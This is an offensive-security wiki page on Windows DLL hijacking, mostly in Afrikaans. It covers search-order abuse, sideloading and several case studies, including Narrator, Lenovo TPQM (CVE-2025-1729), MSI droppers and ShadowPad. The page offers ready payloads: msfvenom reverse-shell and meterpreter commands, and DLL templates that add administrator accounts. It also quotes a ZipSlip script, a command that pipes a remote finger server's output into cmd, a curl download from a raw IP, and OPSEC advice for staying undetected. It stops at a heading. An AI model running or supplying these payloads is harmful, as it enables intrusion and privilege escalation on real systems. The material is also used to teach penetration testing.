# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basiese Inligting

DLL Hijacking behels die manipulasie van 'n vertroude toepassing om 'n kwaadwillige DLL te laai. Hierdie term omsluit verskeie taktieke soos **DLL Spoofing, Injection, and Side-Loading**. Dit word hoofsaaklik gebruik vir code execution, om persistence te verkry, en minder gereeld vir privilege escalation. Alhoewel die fokus hier op escalation is, bly die metode van hijacking konsekwent oor die verskillende doelwitte.

### Algemene Tegnieke

Verskeie metodes word gebruik vir DLL hijacking, elk met sy doeltreffendheid afhangend van die toepassing se DLL-laaistrategie:

1. **DLL Replacement**: Die vervanging van 'n egte DLL met 'n kwaadwillige een, opsioneel deur DLL Proxying te gebruik om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Die plasing van die kwaadwillige DLL in 'n soekpad wat voor die wettige een kom, wat die toepassing se soekpatroon uitbuit.
3. **Phantom DLL Hijacking**: Die skep van 'n kwaadwillige DLL sodat 'n toepassing dit laai omdat dit dink dit is 'n vereiste DLL wat nie bestaan nie.
4. **DLL Redirection**: Die wysiging van soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local` lêers om die toepassing na die kwaadwillige DLL te lei.
5. **WinSxS DLL Replacement**: Die vervanging van die wettige DLL met 'n kwaadwillige eweknie in die WinSxS gids, 'n metode wat gereeld met DLL side-loading geassosieer word.
6. **Relative Path DLL Hijacking**: Die plasing van die kwaadwillige DLL in 'n gebruiker-beheerde gids saam met die gekopieerde toepassing, wat soortgelyk is aan Binary Proxy Execution tegnieke.

> [!TIP]
> Vir 'n stap-vir-stap ketting wat HTML staging, AES-CTR configs, en .NET implants bo-op DLL sideloading lae, sien die onderstaande workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Om ontbrekende Dlls te vind

Die algemeenste manier om ontbrekende DLLs in 'n stelsel te vind, is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van Sysinternals te laat loop en die **volgende 2 filters** te stel:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

en net die **File System Activity** te wys:

![](<../../../images/image (153).png>)

As jy op soek is na **missing dlls in general** laat jy dit vir 'n paar **sekondes** loop.  
As jy 'n **missing dll inside an specific executable** soek, stel 'n **ander filter soos "Process Name" "contains" `<exec name>`, voer dit uit, en stop capturing events**.

## Exploiting Missing Dlls

Om privilege escalation te bereik, is die beste kans dat ons 'n DLL kan skryf wat 'n privileged proses sal probeer laai in een van die plekke waar dit gesoek gaan word. Daarom kan ons 'n DLL skryf in 'n gids waar die DLL gesoek word voordat die gids met die oorspronklike DLL is (vreemde geval), of ons kan skryf in 'n gids waar die DLL gesoek gaan word terwyl die oorspronklike DLL nie in enige gids bestaan nie.

### Dll Search Order

In die [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) kan jy vind hoe die DLLs spesifiek gelaai word.

Windows applications soek na DLLs deur 'n stel vooraf-gedefinieerde soekpaaie te volg, volgens 'n sekere volgorde. Die probleem van DLL hijacking ontstaan wanneer 'n skadelike DLL strategies in een van hierdie gidse geplaas word, wat verseker dat dit voor die oorspronklike DLL gelaai word. 'n Oplossing om dit te voorkom is om te verseker dat die toepassing absolute paths gebruik wanneer dit na die DLLs verwys wat dit benodig.

Jy kan die **DLL search order on 32-bit** stelsels hieronder sien:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Dit is die **default** soekorde met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer is, skuif die huidige gids op na die tweede plek. Om hierdie funksie te deaktiveer, skep die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit op 0 (standaard is geaktiveer).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funksie met **LOAD_WITH_ALTERED_SEARCH_PATH** aangeroep word, begin die soektog in die gids van die executable module wat **LoadLibraryEx** laai.

Laastens, neem kennis dat 'n dll gelaai kan word deur die absolute path aan te dui in plaas van net die naam. In daardie geval gaan daardie dll slegs in daardie pad gesoek word (as die dll enige afhanklikhede het, gaan hulle gesoek word soos net gelaai deur naam).

Daar is ander maniere om die soekorde te verander, maar ek gaan dit nie hier verduidelik nie.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Use **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) to collect DLL names that the process probes but cannot find.
2. If the binary runs on a **schedule/service**, dropping a DLL with one of those names into the **application directory** (search-order entry #1) will be loaded on the next execution. In one .NET scanner case the process looked for `hostfxr.dll` in `C:\samples\app\` before loading the real copy from `C:\Program Files\dotnet\fxr\...`.
3. Build a payload DLL (e.g. reverse shell) with any export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. If your primitive is a **ZipSlip-style arbitrary write**, craft a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Lewer die argief af in die waargeneemde inbox/share; wanneer die geskeduleerde taak die proses weer begin, laai dit die kwaadwillige DLL en voer jou kode uit as die service-rekening.

### Afdwing van sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

’n Gevorderde manier om die DLL-soekpad van ’n pas geskepte proses deterministies te beïnvloed, is om die DllPath-veld in RTL_USER_PROCESS_PARAMETERS te stel wanneer die proses geskep word met ntdll se native APIs. Deur hier ’n deur die aanvaller-beheerde gids te verskaf, kan ’n teikenproses wat ’n ingevoerde DLL by naam oplos (geen absolute pad en nie die gebruik van die safe loading flags nie) gedwing word om ’n kwaadwillige DLL vanaf daardie gids te laai.

Sleutelidee
- Bou die prosesparameters met RtlCreateProcessParametersEx en voorsien ’n pasgemaakte DllPath wat na jou beheerde vouer wys (bv. die gids waar jou dropper/unpacker woon).
- Skep die proses met RtlCreateUserProcess. Wanneer die teiken-binary ’n DLL by naam oplos, sal die loader hierdie verskafde DllPath raadpleeg tydens resolusie, wat betroubare sideloading moontlik maak selfs wanneer die kwaadwillige DLL nie saamgeplaas is met die teiken EXE nie.

Aantekeninge/beperkings
- Dit beïnvloed die kindproses wat geskep word; dit verskil van SetDllDirectory, wat slegs die huidige proses beïnvloed.
- Die teiken moet ’n DLL invoer of LoadLibrary by naam gebruik (geen absolute pad en nie die gebruik van LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories nie).
- KnownDLLs en hardgekodeerde absolute paadjies kan nie gekaap word nie. Forwarded exports en SxS kan die prioriteit verander.

Minimale C-voorbeeld (ntdll, wide strings, vereenvoudigde foutbehandeling):

<details>
<summary>Volledige C-voorbeeld: afdwing van sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Eskalering van voorregte

**Vereistes**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Ja, die vereistes is moeilik om te vind aangesien **by default it's kind of weird to find a privileged executable missing a dll** en dit is selfs **more weird to have write permissions on a system path folder** (you can't by default). Maar, in misconfigured omgewings is dit moontlik.\
In die geval jy gelukkig is en aan die vereistes voldoen, kan jy die [UACME](https://github.com/hfiref0x/UACME) project kyk. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer die toestemmings van alle vouers binne PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die imports van 'n executable en die exports van 'n dll nagaan met:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Vir 'n volledige gids oor hoe om **Dll Hijacking te misbruik om voorregte te eskaleer** met toestemmings om in 'n **System Path folder** te skryf, kyk:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sal kontroleer of jy skryf-toestemmings het op enige vouer binne system PATH.\
Ander interessante geautomatiseerde gereedskap om hierdie kwesbaarheid te ontdek is **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Example

As jy 'n uitbuitbare scenario vind, een van die belangrikste dinge om dit suksesvol te benut sal wees om **'n dll te skep wat ten minste al die funksies eksporteer wat die uitvoerbare lêer daarvandaan sal invoer**. Neem ook kennis dat Dll Hijacking handig kan wees om te [eskaleer vanaf Medium Integrity level na High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) of van[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **hoe om 'n geldige dll te skep** binne hierdie dll hijacking-studie gefokus op dll hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Boonop, in die **volgende sectio**n kan jy 'n paar **basiese dll kodes** vind wat nuttig kan wees as **templates** of om 'n **dll met nie-vereiste funksies geëksporteer** te skep.

## **Skep en kompileer Dlls**

### **Dll Proxifying**

Basies is 'n **Dll proxy** 'n Dll wat in staat is om **jou kwaadwillige kode uit te voer wanneer dit gelaai word** maar ook om te **eksponer** en **te werk** soos **verwag** deur **alle oproepe na die werklike biblioteek te herlei**.

Met die gereedskap [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik **'n executable aandui en die library kies** wat jy wil proxify en **'n proxified dll genereer** of **die Dll aandui** en **'n proxified dll genereer**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (x86, ek het nie 'n x64-weergawe gesien nie):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

Neem kennis dat in verskeie gevalle die Dll wat jy kompileer moet **export several functions** wat deur die slagofferproses gelaai gaan word; as hierdie funksies nie bestaan nie, sal die **binary won't be able to load** hulle nie en sal die **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-voorbeeld met gebruikersaanmaak</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatiewe C DLL met thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Gevallestudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe speur steeds by opstart na 'n voorspelbare, taalspesifieke localization DLL wat gekaap kan word vir arbitrary code execution en persistence.

Belangrike feite
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- As 'n writable attacker-controlled DLL by die OneCore-pad bestaan, word dit gelaai en `DllMain(DLL_PROCESS_ATTACH)` uitvoer. Geen exports is benodig nie.

Opsporing met Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Begin Narrator en kyk na die poging om bogenoemde pad te laai.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- 'n naiewe hijack sal die UI laat praat/uitlig. Om stil te bly, wanneer jy aanheg, enumereer Narrator-drade, open die hoofdraad (`OpenThread(THREAD_SUSPEND_RESUME)`) en `SuspendThread` dit; gaan voort in jou eie draad. Sien PoC vir volle kode.

Trigger and persistence via Accessibility configuration
- Gebruikerskonteks (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Met bogenoemde, wanneer Narrator begin sal dit die geplante DLL laai. Op die secure desktop (logon screen), druk CTRL+WIN+ENTER om Narrator te begin; jou DLL word as SYSTEM op die secure desktop uitgevoer.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP na die gasheer; by die logon-skerm druk CTRL+WIN+ENTER om Narrator te begin; jou DLL word as SYSTEM op die secure desktop uitgevoer.
- Uitvoering stop wanneer die RDP-sessie sluit — inject/migrate onmiddellik.

Bring Your Own Accessibility (BYOA)
- Jy kan 'n ingeboude Accessibility Tool (AT) registerinskrywing kloon (bv. CursorIndicator), dit wysig om na 'n ewekansige binary/DLL te wys, dit importeer, en dan `configuration` op daardie AT-naam stel. Dit bied 'n proxy vir ewekansige uitvoering binne die Accessibility framework.

Notes
- Om te skryf onder `%windir%\System32` en HKLM-waardes te verander vereis adminregte.
- Alle payload-logika kan in `DLL_PROCESS_ATTACH` leef; geen exports word benodig.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Hierdie geval demonstreer **Phantom DLL Hijacking** in Lenovo se TrackPoint Quick Menu (`TPQMAssistant.exe`), aangedui as **CVE-2025-1729**.

### Vulnerability Details

- **Komponent**: `TPQMAssistant.exe` geleë by `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geskeduleerde taak**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` loop daagliks om 9:30 AM onder die konteks van die aangemelde gebruiker.
- **Gids-toestemmings**: Skryfbaar deur `CREATOR OWNER`, wat plaaslike gebruikers toelaat om ewekansige lêers neer te sit.
- **DLL-soekgedrag**: Probeer eers om `hostfxr.dll` uit sy werkgids te laai en log "NAME NOT FOUND" as dit ontbreek, wat aandui dat die plaaslike gids eerste gesoek word.

### Exploit Implementation

'n aanvaller kan 'n kwaadwillige `hostfxr.dll` stub in dieselfde gids plaas en sodoende die ontbrekende DLL benut om code execution onder die gebruiker se konteks te bereik:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Aanvalsverloop

1. As 'n standaard gebruiker, drop `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag vir die geskeduleerde taak om 9:30 VM in die huidige gebruiker se konteks te loop.
3. As 'n administrateur aangeteken is wanneer die taak uitgevoer word, hardloop die malicious DLL in die administrateur se sessie op medium integrity.
4. Chain standaard UAC bypass techniques om van medium integrity na SYSTEM privileges te eskaleer.

## Gevallestudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors kombineer dikwels MSI-based droppers met DLL side-loading om payloads uit te voer onder 'n vertroude, signed process.

Oorsig van die ketting
- User downloads MSI. 'n CustomAction loop stilweg tydens die GUI install (bv. LaunchApplication of 'n VBScript action), en rekonstrueer die volgende fase vanaf embedded resources.
- Die dropper skryf 'n legitieme, signed EXE en 'n malicious DLL na dieselfde gids (voorbeeldpaar: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wanneer die signed EXE begin word, laai Windows DLL search order wsc.dll vanaf die working directory eerste, wat attacker code uitvoer onder 'n signed parent (ATT&CK T1574.001).

MSI-analise (waarop om te let)
- CustomAction table:
- Kyk vir inskrywings wat executables of VBScript loop. Voorbeeld van 'n verdagte patroon: LaunchApplication wat 'n embedded file in die agtergrond uitvoer.
- In Orca (Microsoft Orca.exe), inspekteer CustomAction, InstallExecuteSequence en Binary tables.
- Embedded/split payloads in die MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Kyk vir meerdere klein fragmente wat gekonkateneer en ontsleutel word deur 'n VBScript CustomAction. Algemene vloei:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktiese sideloading met wsc_proxy.exe
- Plaas hierdie twee lêers in dieselfde gids:
- wsc_proxy.exe: legitieme gesigneerde host (Avast). Die proses probeer wsc.dll by naam uit sy gids laai.
- wsc.dll: attacker DLL. As geen spesifieke exports benodig word nie, DllMain is voldoende; anders bou 'n proxy DLL en stuur vereiste exports deur na die genuine library terwyl die payload in DllMain uitgevoer word.
- Bou 'n minimale DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Vir exportvereistes, gebruik 'n proxying framework (e.g., DLLirant/Spartacus) om 'n forwarding DLL te genereer wat ook jou payload uitvoer.

- Hierdie tegniek berus op DLL-naamresolusie deur die host-binaire. As die host absolute paaie of veilige laaivlags gebruik (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kan die hijack misluk.
- KnownDLLs, SxS, en forwarded exports kan prioriteit beïnvloed en moet oorweeg word tydens die keuse van die host-binaire en export-stel.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point beskryf hoe Ink Dragon ShadowPad ontplooi deur 'n **three-file triad** te gebruik om by wettige sagteware in te meng terwyl die kern payload op skyf enkripteer bly:

1. **Signed host EXE** – vendors such as AMD, Realtek, or NVIDIA are abused (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die aanvallers hernoem die uitvoerbare lêer om soos 'n Windows-binaire te lyk (byvoorbeeld `conhost.exe`), maar die Authenticode-handtekening bly geldig.
2. **Malicious loader DLL** – dropped next to the EXE with an expected name (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL is gewoonlik 'n MFC-binary wat met die ScatterBrain framework obfuskated is; sy enigste taak is om die enkripteerde blob te lokaliseer, dit te ontsleutel, en ShadowPad reflektief te map.
3. **Encrypted payload blob** – often stored as `<name>.tmp` in the same directory. Nadat die gedeskripsieerde payload in geheue gemap is, verwyder die loader die TMP-lêer om forensiese bewyse te vernietig.

Tradecraft notes:

* Deur die gesigneerde EXE te hernoem (terwyl die oorspronklike `OriginalFileName` in die PE header behou word) kan dit as 'n Windows-binaire vermom saamloop terwyl die verskafferhandtekening behou bly; repliseer dus Ink Dragon se gewoonte om `conhost.exe`-agtige binaries te laat val wat eintlik AMD/NVIDIA utilities is.
* Omdat die uitvoerbare lêer as vertrou bly, benodig die meeste allowlisting-kontroles slegs dat jou kwaadaardige DLL langs dit sit. Fokus op die aanpassing van die loader DLL; die gesigneerde ouer kan tipies ongemoeid loop.
* ShadowPad’s decryptor verwag dat die TMP-blob langs die loader woon en skryfbaar is sodat dit die lêer na nul kan maak nadat dit gemap is. Hou die gids skryfbaar totdat die payload laai; eens in geheue kan die TMP-lêer veilig verwyder word vir OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operateurs kombineer DLL sideloading met LOLBAS sodat die enigste pasgemaakte artefak op skyf die kwaadaardige DLL langs die vertroude EXE is:

- **Remote command loader (Finger):** Hidden PowerShell spawns `cmd.exe /c`, pulls commands from a Finger server, and pipes them to `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` haal TCP/79-tekst; `| cmd` voer die bediener-reaksie uit, wat operateurs toelaat om die tweede stadium bediener-side te roteer.

- **Built-in download/extract:** Laai 'n argief met 'n onskuldige uitbreiding af, pak dit uit, en stage die sideload teiken plus DLL onder 'n ewekansige `%LocalAppData%` gids:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` verberg vordering en volg redirects; `tar -xf` gebruik Windows se ingeboude tar.

- **WMI/CIM launch:** Begin die EXE via WMI sodat telemetrie 'n CIM-gegenereerde proses wys terwyl dit die kolokale DLL laai:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Werk met binaries wat plaaslike DLLs verkies (e.g., `intelbq.exe`, `nearby_share.exe`); payload (e.g., Remcos) loop onder die vertroude naam.

- **Hunting:** Opsporing: waarsku op `forfiles` wanneer `/p`, `/m`, en `/c` saam voorkom; seldsaam buite admin-skripte.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

'n Onlangse Lotus Blossom intrusie het 'n vertroude update chain misbruik om 'n NSIS-gepakde dropper te lewer wat 'n DLL sideload plus volledig in-geheue payloads gefaseer het.

Tradecraft flow
- `update.exe` (NSIS) skep `%AppData%\Bluetooth`, merk dit **HIDDEN**, laat 'n hernoemde Bitdefender Submission Wizard `BluetoothService.exe`, 'n kwaadaardige `log.dll`, en 'n enkripteerde blob `BluetoothService` val, en lanceer dan die EXE.
- Die host EXE import `log.dll` en roep `LogInit`/`LogWrite` aan. `LogInit` mmap-loads die blob; `LogWrite` ontsleutel dit met 'n pasgemaakte LCG-gebaseerde stroom (konstantes **0x19660D** / **0x3C6EF35F**, sleutelmateriaal afgelei van 'n vorige hash), oorskryf die buffer met plaintext shellcode, maak tydelike hulpbronne vry, en spring daarnaheen.
- Om 'n IAT te vermy, los die loader APIs op deur export name te hash met **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, dan 'n Murmur-styl avalanche (**0x85EBCA6B**) toe te pas en te vergelyk met gesoute teiken-hashes.

Main shellcode (Chrysalis)
